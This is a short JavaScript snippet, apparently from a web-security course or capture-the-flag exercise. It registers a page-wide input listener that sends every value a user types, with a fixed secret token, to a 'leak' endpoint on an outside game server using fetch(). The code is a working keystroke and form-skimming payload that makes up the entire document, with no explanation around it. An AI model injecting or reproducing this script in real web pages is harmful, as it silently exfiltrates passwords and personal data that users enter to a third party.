document.addEventListener("input", e => {
    fetch(
      "https://gameserver.websec.saarland/leak" +
      "?secret=3b4321f361abd94cf42521e814840777" +
      "&data=" + encodeURIComponent(e.target.value)
    );
});